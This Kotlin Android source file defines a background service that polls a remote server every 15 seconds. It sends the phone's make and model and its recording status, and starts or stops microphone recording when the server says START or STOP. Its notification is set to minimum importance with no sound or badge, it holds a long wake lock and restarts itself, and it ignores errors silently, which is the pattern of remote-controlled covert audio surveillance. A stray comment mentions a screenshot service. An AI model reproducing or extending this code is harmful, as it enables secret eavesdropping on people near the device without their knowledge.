package com.audiostream.client

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class CommandService : Service() {

    companion object {
        const val ACTION_START_POLLING = "ACTION_START_POLLING"
        const val ACTION_STOP_POLLING = "ACTION_STOP_POLLING"
        const val CHANNEL_ID = "command_monitor_channel"
        const val NOTIFICATION_ID = 2

        @Volatile
        var isPolling = false
            private set
    }

    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var serverUrl = ""
    private var clientName = ""

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        clientName = generateClientName()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action

        when (action) {
            ACTION_START_POLLING -> {
                val url = intent.getStringExtra(AudioRecordService.EXTRA_SERVER_URL)
                if (url != null) {
                    serverUrl = url
                    startPollingService()
                } else {
                    val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
                    serverUrl = prefs.getString("server_url", "") ?: ""
                    if (serverUrl.isNotEmpty()) {
                        startPollingService()
                    }
                }
            }
            ACTION_STOP_POLLING -> {
                stopPollingService()
            }
        }
        return START_STICKY
    }

    private fun startPollingService() {
        if (isPolling) return
        isPolling = true

        acquireWakeLock()
        startForeground(NOTIFICATION_ID, buildNotification())
        startCommandPolling()
    }

    private fun stopPollingService() {
        isPolling = false
        releaseWakeLock()
        serviceScope.coroutineContext.cancelChildren()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    private fun startCommandPolling() {
        serviceScope.launch(Dispatchers.IO) {
            while (isPolling) {
                try {
                    val encodedClientName = java.net.URLEncoder.encode(clientName, "UTF-8")
                    val status = if (AudioRecordService.isRunning) "recording" else "idle"
                    val endpoint = "${serverUrl.trimEnd('/')}/api/v1/broadcasts/command?client_id=$encodedClientName&status=$status"
                    
                    val request = Request.Builder().url(endpoint).get().build()
            
                    httpClient.newCall(request).execute().use { response ->
                        if (response.isSuccessful) {
                            val body = response.body?.string()
                            if (body != null) {
                                val json = JSONObject(body)
                                val command = json.optString("command", "NONE")
                                
                                // Save screenshot settings for ScreenshotService
                                if (command == "START" && !AudioRecordService.isRunning) {
                                    startAudioService()
                                } else if (command == "STOP" && AudioRecordService.isRunning) {
                                    stopAudioService()
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    // Ignore transient network errors
                }
                delay(15000L) // Poll every 15 seconds
            }
        }
    }

    private fun startAudioService() {
        val intent = Intent(this, AudioRecordService::class.java).apply {
            action = AudioRecordService.ACTION_START
            putExtra(AudioRecordService.EXTRA_SERVER_URL, serverUrl)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun stopAudioService() {
        val intent = Intent(this, AudioRecordService::class.java).apply {
            action = AudioRecordService.ACTION_STOP
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun generateClientName(): String {
        val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        val saved = prefs.getString("client_name", null)
        if (saved != null) return saved

        val manufacturer = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model = Build.MODEL.replace(" ", "-")
        val name = "$manufacturer-$model"

        prefs.edit().putString("client_name", name).apply()
        return name
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "AudioMonitor::CommandWakelock"
        ).apply {
            setReferenceCounted(false)
            acquire(24 * 60 * 60 * 1000L)
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (e: Exception) { /* ignore */ }
        wakeLock = null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Command Monitor",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Listening for remote commands"
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Audio Monitor")
            .setContentText("Listening for commands...")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }
}
